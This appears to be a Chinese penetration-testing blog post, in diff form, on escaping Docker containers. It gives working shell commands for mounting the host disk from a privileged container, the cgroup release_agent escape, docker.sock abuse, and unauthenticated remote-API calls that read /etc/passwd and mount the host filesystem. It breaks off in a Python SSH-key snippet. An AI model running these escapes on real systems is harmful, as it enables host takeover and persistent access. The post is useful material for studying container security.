@@ -1,0 +1,385 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="AMao"><meta name="renderer" content="webkit"><meta name="copyright" content="AMao"><meta name="keywords" content="AMao's Blog"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Docker 逃逸 · AMao's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">AMao</div><div class="profile-signature">小菜鸡目前对一些东西的认知，希望师傅们可以帮忙纠正！</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">AMao's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">Docker 逃逸</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2020-09-09</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" target="_blank" rel="noopener" date-tags="CTF"> CTF</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" target="_blank" rel="noopener" date-tags="Web安全"> Web安全</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" target="_blank" rel="noopener" date-tags="渗透测试"> 渗透测试</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">3.3k</span> | Reading time: <span class="post-count">15</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a>Docker 逃逸</h1><blockquote>
+<p>获取的一个Wegshell之后，需要判断是虚拟机或是物理机，还是 Docker</p>
+</blockquote>
+<h2 id="判断是否为-Docker"><a href="#判断是否为-Docker" class="headerlink" title="判断是否为 Docker"></a>判断是否为 Docker</h2><ul>
+<li><p>systemd-detect-virt -c</p>
+<ul>
+<li>none  不是容器</li>
+<li>目前很少容器里面放 <code>systemd</code> 的，我见过的就只有 LXD 的<code>ubuntu</code>镜像，因此这种方法适用性不广</li>
+</ul>
+</li>
+<li><p>查看 /.dockerenv </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">docker</span></span><br><span class="line"> root@b7c29ed0e534:/# ls -alh /.dockerenv </span><br><span class="line"> -rwxr-xr-x 1 root root 0 Jun 13 08:42 /.dockerenv</span><br><span class="line"> </span><br><span class="line"><span class="meta"> #</span><span class="bash">非docker</span></span><br><span class="line">  ~ ls -alh /.dockerenv </span><br><span class="line"> ls: cannot access '/.dockerenv': No such file or directory</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查询系统进程的cgroup信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 非docker</span></span><br><span class="line">➜  ~ cat /proc/1/cgroup</span><br><span class="line">12:memory:/init.scope</span><br><span class="line">11:blkio:/init.scope</span><br><span class="line">10:rdma:/</span><br><span class="line">9:devices:/init.scope</span><br><span class="line">8:pids:/init.scope</span><br><span class="line">7:freezer:/</span><br><span class="line">6:cpuset:/</span><br><span class="line">5:net_cls,net_prio:/</span><br><span class="line">4:perf_event:/</span><br><span class="line">3:cpu,cpuacct:/init.scope</span><br><span class="line">2:hugetlb:/</span><br><span class="line">1:name=systemd:/init.scope</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker</span></span><br><span class="line">root@b7c29ed0e534:/# cat /proc/1/cgroup</span><br><span class="line">12:memory:/docker/b7c29ed0e534e78e91b7c7b80077633db9dcc8254853ec55981af6a346facd70</span><br><span class="line">11:blkio:/docker/b7c29ed0e534e78e91b7c7b80077633db9dcc8254853ec55981af6a346facd70</span><br><span class="line">10:rdma:/</span><br><span class="line">9:devices:/docker/b7c29ed0e534e78e91b7c7b80077633db9dcc8254853ec55981af6a346facd70</span><br><span class="line">8:pids:/docker/b7c29ed0e534e78e91b7c7b80077633db9dcc8254853ec55981af6a346facd70</span><br><span class="line">7:freezer:/docker/b7c29ed0e534e78e91b7c7b80077633db9dcc8254853ec55981af6a346facd70</span><br><span class="line">6:cpuset:/docker/b7c29ed0e534e78e91b7c7b80077633db9dcc8254853ec55981af6a346facd70</span><br><span class="line">5:net_cls,net_prio:/docker/b7c29ed0e534e78e91b7c7b80077633db9dcc8254853ec55981af6a346facd70</span><br><span class="line">4:perf_event:/docker/b7c29ed0e534e78e91b7c7b80077633db9dcc8254853ec55981af6a346facd70</span><br><span class="line">3:cpu,cpuacct:/docker/b7c29ed0e534e78e91b7c7b80077633db9dcc8254853ec55981af6a346facd70</span><br><span class="line">2:hugetlb:/docker/b7c29ed0e534e78e91b7c7b80077633db9dcc8254853ec55981af6a346facd70</span><br><span class="line">1:name=systemd:/docker/b7c29ed0e534e78e91b7c7b80077633db9dcc8254853ec55981af6a346facd70</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="配置不当引发的-doker-逃逸"><a href="#配置不当引发的-doker-逃逸" class="headerlink" title="配置不当引发的 doker 逃逸"></a>配置不当引发的 doker 逃逸</h2><h3 id="不安全的启动参数"><a href="#不安全的启动参数" class="headerlink" title="不安全的启动参数"></a>不安全的启动参数</h3><blockquote>
+<p>以特权模式启动时，docker容器内拥有宿主机文件读写权限，可以通过写ssh公钥、计划任务等方式达到逃逸</p>
+</blockquote>
+<ul>
+<li><p>条件</p>
+<blockquote>
+<p>以–privileged 参数启动 docker container<br>获得 docker container shell，比如通过蜜罐漏洞、业务漏洞等途径获得</p>
+</blockquote>
+</li>
+<li><p>参数</p>
+<blockquote>
+<p>–cap-add=SYS_ADMIN  启动时虽然有挂载权限，但没发直接获得资源去挂载，需要其他方法获得资源或其它思路才能利用。</p>
+<p>–net=host  启动时，绕过Network Namespace</p>
+<p>–pid=host  启动时，绕过PID Namespace</p>
+<p>–ipc=host 启动时，绕过IPC Namespace</p>
+<p>–volume /:/host   挂载主机目录到container</p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>网络如果没其他配置，docker不添加网络限制参数，默认使用桥接网络，通过docker0可以访问host</p>
+</blockquote>
+<h4 id="–privileged-利用"><a href="#–privileged-利用" class="headerlink" title="–privileged 利用"></a>–privileged 利用</h4><blockquote>
+<p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。</p>
+<p>启动Docker容器。使用此参数时，容器可以完全访问所有设备，并且不受seccomp，AppArmor和Linux capabilities的限制</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动docker</span></span><br><span class="line">➜  ubuntu docker run -it --privileged image_ID  /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看磁盘文件: </span></span><br><span class="line">root@1f63dc2c6a3a:/# fdisk -l</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建目录以备挂载: </span></span><br><span class="line">root@1f63dc2c6a3a: mkdir /docker_dir</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将宿主机/dev/sda1目录挂载至容器内: </span></span><br><span class="line">root@1f63dc2c6a3a: mount /dev/sda1 /docker_dir</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 即可对主机文件进行操作</span></span><br><span class="line">root@1f63dc2c6a3a: echo 11 &gt; /docker_dir/root/tt </span><br><span class="line">➜  ~ cat /root/tt	#外部机器</span><br><span class="line">11</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里可以写入shh client 的公钥，然后通过公钥进行shh登录</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="–cap-add-SYS-ADMIN-利用"><a href="#–cap-add-SYS-ADMIN-利用" class="headerlink" title="–cap-add=SYS_ADMIN 利用"></a>–cap-add=SYS_ADMIN 利用</h4><blockquote>
+<p>Linux内核自版本2.2起引入功能（capabilities）机制，打破了UNIX/LINUX操作系统中超级用户与普通用户的概念，允许普通用户执行超级用户权限方能运行的命令。</p>
+<p>截至Linux 3.0版本，Linux中共有38种capabilities。Docker容器默认限制为14个capabilities，管理员可以使用—cap-add和—cap-drop选项为容器精确配置capabilities。</p>
+<p>当容器使用特权模式启动时，将被赋予所有capabilities。此外，在—cap-add的诸多选项中，SYSADMIN意为container进程允许执行mount、umount等一系列系统管理操作，因此当容器以—cap-add=SYSADMIN启动时，也将面临威胁。</p>
+</blockquote>
+<ul>
+<li>条件<ul>
+<li>在容器内root用户</li>
+<li>容器必须使用SYS_ADMIN Linux capability运行</li>
+<li>容器必须缺少AppArmor配置文件，否则将允许mount syscall</li>
+<li>cgroup v1虚拟文件系统必须以读写方式安装在容器内部</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> On the host</span></span><br><span class="line">docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> In the container</span></span><br><span class="line">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`</span><br><span class="line">echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</span><br><span class="line"></span><br><span class="line">echo '#!/bin/sh' &gt; /cmd</span><br><span class="line">echo "ls &gt; $host_path/output" &gt;&gt; /cmd</span><br><span class="line">chmod a+x /cmd</span><br><span class="line">sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"</span><br></pre></td></tr></table></figure>
+
+<h3 id="docker-sock-简述"><a href="#docker-sock-简述" class="headerlink" title="docker.sock 简述"></a>docker.sock 简述</h3><blockquote>
+<p>Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon扮演，二者之间通信方式有以下3种：</p>
+<ul>
+<li>unix:///var/run/docker.sock</li>
+<li>tcp://host:port</li>
+<li>fd://socketfd</li>
+</ul>
+<p>其中使用docker.sock进行通信为默认方式，当容器中进程需在生产过程中与Docker守护进程通信时，容器本身需要挂载/var/run/docker.sock文件。</p>
+<p>本质上而言，能够访问docker socket 或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务通常可以访问整个主机系统。</p>
+</blockquote>
+<ul>
+<li><p>思路</p>
+<blockquote>
+<p>当容器访问docker socket时，可通过与docker daemon的通信对其进行恶意操纵完成逃逸。</p>
+<p>若容器A可以访问docker socket，可在其内部安装client（docker），通过docker.sock与宿主机的server（docker daemon）进行交互，运行并切换至不安全的容器B，最终在容器B中控制宿主机。</p>
+</blockquote>
+</li>
+<li><p>过程</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 运行一个挂载 /var/run 的容器</span></span><br><span class="line">➜  ~ docker run -it -v /var/run/:/host/var/run/ 183 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在容器内安装Docker作为client(根据网络情况换源)</span></span><br><span class="line">root@6ac99fce30d9: apt-get install docker.io</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看宿主机 docker 信息</span></span><br><span class="line">root@6ac99fce30d9: docker -H unix:///host/var/run/docker.sock info</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行一个新容器并挂载宿主机根路径</span></span><br><span class="line">root@6ac99fce30d9: docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:14.04 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Docker ID已经变了,可以对主机的文件进行操作</span></span><br><span class="line">root@1f63dc2c6a3a: ls /aa</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="docker-remote-api-未授权访问"><a href="#docker-remote-api-未授权访问" class="headerlink" title="docker remote api 未授权访问"></a>docker remote api 未授权访问</h3><blockquote>
+<p>docker.sock 暴露到公网并且可以未授权访问到 api</p>
+</blockquote>
+<ul>
+<li>条件<ul>
+<li>root权限启动docker</li>
+<li>API 版本大于1.5</li>
+</ul>
+</li>
+</ul>
+<h4 id="docker-swarm简述"><a href="#docker-swarm简述" class="headerlink" title="docker swarm简述"></a>docker swarm简述</h4><blockquote>
+<p>docker swarm是管理docker集群的工具。主从管理、默认通过2375端口通信。绑定了一个Docker Remote API的服务，可以通过HTTP、Python、调用API来操作Docker。</p>
+</blockquote>
+<ul>
+<li><p>启动</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker daemon -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在没有其他网络访问限制的主机上使用，则会在公网暴漏端口</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="HTTP-利用-api"><a href="#HTTP-利用-api" class="headerlink" title="HTTP 利用 api"></a>HTTP 利用 api</h4><h5 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h5><ul>
+<li><p>列出所有容器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -X GET http://&lt;docker_host&gt;:PORT/containers/json</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Api-Version</span>: 1.39</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Docker-Experimental</span>: false</span><br><span class="line"><span class="attribute">Ostype</span>: linux</span><br><span class="line"><span class="attribute">Server</span>: Docker/18.09.4 (linux)</span><br><span class="line"><span class="attribute">Date</span>: Thu, 04 Apr 2019 05:56:03 GMT</span><br><span class="line"><span class="attribute">Content-Length</span>: 1780</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        "Id":"a4621ceab3729702f18cfe852003489341e51e036d13317d8e7016facb8ebbaf",</span><br><span class="line">        "Names":["/another_container"],</span><br><span class="line">        "Image":"ubuntu:latest",</span><br><span class="line">        "ImageID":"sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499",</span><br><span class="line">        "Command":"bash",</span><br><span class="line">        "Created":1554357359,</span><br><span class="line">        "Ports":[],</span><br><span class="line">        "Labels":&#123;&#125;,</span><br><span class="line">        "State":"running",</span><br><span class="line">        "Status":"Up 3 seconds",</span><br><span class="line">        "HostConfig":&#123;"NetworkMode":"default"&#125;,</span><br><span class="line">        "NetworkSettings":&#123;"Networks": </span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>TIPS：留意Id字段</p>
+</blockquote>
+</li>
+<li><p>创建 exec</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/containers/&lt;container_id&gt;/exec</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: &lt;docker_host&gt;:PORT</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 188</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "AttachStdin": true,</span><br><span class="line">  "AttachStdout": true,</span><br><span class="line">  "AttachStderr": true,</span><br><span class="line">  "Cmd": ["cat", "/etc/passwd"],</span><br><span class="line">  "DetachKeys": "ctrl-p,ctrl-q",</span><br><span class="line">  "Privileged": true,</span><br><span class="line">  "Tty": true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -X POST \</span><br><span class="line">-H "Content-Type: application/json" \</span><br><span class="line">--data-binary '&#123;"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true&#125;' \</span><br><span class="line">http://&lt;docker_host&gt;:PORT/containers/&lt;container_id&gt;/exec</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">201</span> Created</span><br><span class="line"><span class="attribute">Api-Version</span>: 1.39</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Docker-Experimental</span>: false</span><br><span class="line"><span class="attribute">Ostype</span>: linux</span><br><span class="line"><span class="attribute">Server</span>: Docker/18.09.4 (linux)</span><br><span class="line"><span class="attribute">Date</span>: Fri, 05 Apr 2019 00:51:31 GMT</span><br><span class="line"><span class="attribute">Content-Length</span>: 74</span><br><span class="line"></span><br><span class="line">&#123;"Id":"8b5e4c65e182cec039d38ddb9c0a931bbba8f689a4b3e1be1b3e8276dd2d1916"&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>TIPS：记录下Id</p>
+</blockquote>
+</li>
+<li><p>启动exec</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/exec/&lt;exec_id&gt;/start</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: &lt;docker_host&gt;:PORT</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> "Detach": false,</span><br><span class="line"> "Tty": false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -X POST \</span><br><span class="line">-H 'Content-Type: application/json' \</span><br><span class="line">--data-binary '&#123;"Detach": false,"Tty": false&#125;' \</span><br><span class="line">http://&lt;docker_host&gt;:PORT/exec/&lt;exec_id&gt;/start</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span>: application/vnd.docker.raw-stream</span><br><span class="line"><span class="attribute">Api-Version</span>: 1.39</span><br><span class="line"><span class="attribute">Docker-Experimental</span>: false</span><br><span class="line"><span class="attribute">Ostype</span>: linux</span><br><span class="line"><span class="attribute">Server</span>: Docker/18.09.4 (linux)</span><br><span class="line"></span><br><span class="line"><span class="attribute">root:x:0:0:root:/root:/bin/bash</span></span><br><span class="line"><span class="attribute">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span><br><span class="line"><span class="attribute">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span></span><br><span class="line"><span class="attribute">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h5 id="接管主机"><a href="#接管主机" class="headerlink" title="接管主机"></a>接管主机</h5><blockquote>
+<p>启动一个docker容器，主机的根目录安装到容器的一个卷上，这样就可以对主机的文件系统执行命令。</p>
+<p>条件：允许完全的控制API</p>
+</blockquote>
+<ul>
+<li><p>下载镜像</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k  -X 'POST' \</span><br><span class="line">-H 'Content-Type: application/json' \</span><br><span class="line">http://&lt;docker_host&gt;:PORT/images/create?fromImage=ubuntu&amp;tag=latest</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用已安装的卷创建容器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k  -X 'POST' \</span><br><span class="line">-H 'Content-Type: application/json' \</span><br><span class="line">--data-binary '&#123;"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"OpenStdin": true,"StdinOnce": true,"Entrypoint": "/bin/bash","Image": "ubuntu","Volumes": &#123;"/hostos/": &#123;&#125;&#125;,"HostConfig": &#123;"Binds": ["/:/hostos"]&#125;&#125;' \</span><br><span class="line">http://&lt;docker_host&gt;:PORT/containers/create</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>启动容器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k  -X 'POST' \</span><br><span class="line">-H 'Content-Type: application/json' \</span><br><span class="line">http://&lt;docker_host&gt;:PORT/containers/&lt;container_ID&gt;/start</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<blockquote>
+<p>利用RCE对新容器运行命令，对文件系统进行操作</p>
+</blockquote>
+<blockquote>
+<p>TIPS：如果要对Host OS运行命令，需要添加chroot/hostos</p>
+</blockquote>
+<h4 id="Docker-python-api"><a href="#Docker-python-api" class="headerlink" title="Docker python api"></a>Docker python api</h4><h5 id="写入-ssh-密钥"><a href="#写入-ssh-密钥" class="headerlink" title="写入 ssh 密钥"></a>写入 ssh 密钥</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 